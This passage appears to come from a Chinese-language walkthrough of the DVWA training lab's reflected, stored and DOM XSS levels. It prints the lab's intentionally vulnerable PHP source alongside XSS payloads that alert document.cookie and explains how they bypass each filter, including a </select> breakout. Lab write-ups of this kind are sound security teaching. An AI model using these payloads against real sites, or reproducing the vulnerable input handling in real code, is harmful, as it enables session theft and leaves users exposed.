) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="high："><a href="#high：" class="headerlink" title="high："></a>high：</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload： &lt;img src=<span class="number">0</span> onerror=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)&gt;</span><br><span class="line">      或者&lt;img src=<span class="number">0</span> onerror=<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&gt; </span><br></pre></td></tr></table></figure>
<p><img src="5.png" alt="图片"></p>
<p><img src="6.png" alt="图片"></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>很明显这里无法双写和大小写绕过</p>
<h3 id="impossible-："><a href="#impossible-：" class="headerlink" title="impossible ："></a>impossible ：</h3><p>因为绕不了来看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>用到了<code>htmlspecialchars</code>函数校验，默认会转义<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>&quot;</code>,<code>&#39;</code>等特殊字符</p>
<h2 id="Store型XSS"><a href="#Store型XSS" class="headerlink" title="Store型XSS"></a>Store型XSS</h2><p>low：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="7.png" alt="图片"></p>
<p>可见被写入了服务器中：</p>
<p><img src="8.png" alt="图片"></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );  <span class="comment">#获取用户输入的留言内容（mtxMessage）和名字（txtName）</span></span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );  <span class="comment">#trim()函数去除首尾空白字符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );  <span class="comment">#stripslashes()：去除反斜杠</span></span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));  <span class="comment">#mysqli_real_escape_string()：对字符串进行SQL转义（防SQL注入）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="medium：-1"><a href="#medium：-1" class="headerlink" title="medium："></a>medium：</h3><p>这里在message中加入xss内容一直不行，于是想到在name里面加入，但是有输入长度限制，可以使用抓包发送：</p>
<p><img src="9.png" alt="图片"></p>
<p><img src="10.png" alt="图片"></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>我们可以看到只对message参数使用了<code>addslashes</code>过滤，而name并没有，所以name存在xss</p>
<p><code>addslashes()</code> 函数主要用于在特定字符前添加反斜杠进行转义，这些字符包括：单引号 (<code>&#39;</code>)，双引号 (<code>&quot;</code>)，反斜杠 (<code>\</code>)，NULL 字符</p>
<p>防止sql注入；还用到了<code>mysqli_real_escape_string()</code>防止sql注入</p>
<p>而<code>htmlspecialchars()</code> 是 PHP 中专门用于防御 XSS 攻击的核心函数，该函数将以下特殊字符转换为 HTML 实体：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; → <span class="symbol">&amp;amp;</span></span><br><span class="line">&quot; → <span class="symbol">&amp;quot;</span> (当 ENT_NOQUOTES 未设置时)</span><br><span class="line">&#x27; → <span class="symbol">&amp;#039;</span> (当 ENT_QUOTES 设置时)</span><br><span class="line">&lt; → <span class="symbol">&amp;lt;</span></span><br><span class="line">&gt; → <span class="symbol">&amp;gt;</span></span><br></pre></td></tr></table></figure>
<p>可见这里将我们xss所用到的字符都给转义了，这种是绕不了的，看到了就放弃吧</p>
<h3 id="high：-1"><a href="#high：-1" class="headerlink" title="high："></a>high：</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：txtName=<span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">0</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><img src="11.png" alt="图片"></p>
<p><img src="12.png" alt="图片"></p>
<p>和上面的中级一样，只能用txtname参数，不过这次过滤了<code>&lt;script&gt;</code>，改用其他标签即可</p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="impossible："><a href="#impossible：" class="headerlink" title="impossible："></a>impossible：</h3><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:message&#x27;</span>, <span class="variable">$message</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>有<code>mysqli_real_escape_string</code>和<code>htmlspecialchars</code>这两个函数基本能防御绝大多数sql注入和xss</p>
<h2 id="dom型xss"><a href="#dom型xss" class="headerlink" title="dom型xss"></a>dom型xss</h2><h3 id="low：-1"><a href="#low：-1" class="headerlink" title="low："></a>low：</h3><p>这里只有可选框，没有一个输入框，但我们可以尝试控制url的参数，而不一定非要通过可选框控制：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?<span class="keyword">default</span>=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><img src="13.png" alt="图片"></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No protections, anything goes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="medium：-2"><a href="#medium：-2" class="headerlink" title="medium："></a>medium：</h3><p>前置知识：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浏览器在渲染&lt;select&gt;和&lt;option&gt;标签时，option的内容（无论是标签体还是value属性）都只会被当作纯文本显示，而不会解析为HTML或执行其中的JavaScript代码。因此，即便在value或标签体中插入了&lt;img&gt;标签或onerror事件，浏览器也不会把它当作HTML标签处理，而是直接显示出来</span><br></pre></td></tr></table></figure>
<p>测试：<code>?default=&lt;img src=0 onerror=alert(document.cookie)&gt;</code></p>
<p>并没有弹窗，f12查看源码：</p>
<p><img src="14.png" alt="图片"></p>
<p>写入的语句被写在<code>&lt;select&gt;</code>标签，所以不会被当作js内容解析，解决的办法就是我们注入的语句最前面加上<code>&lt;/select&gt;</code>，主动去闭合前面的<code>&lt;select&gt;</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?<span class="keyword">default</span>=&lt;/select&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">0</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><img src="15.png" alt="图片"></p>
<p>源码：</p>
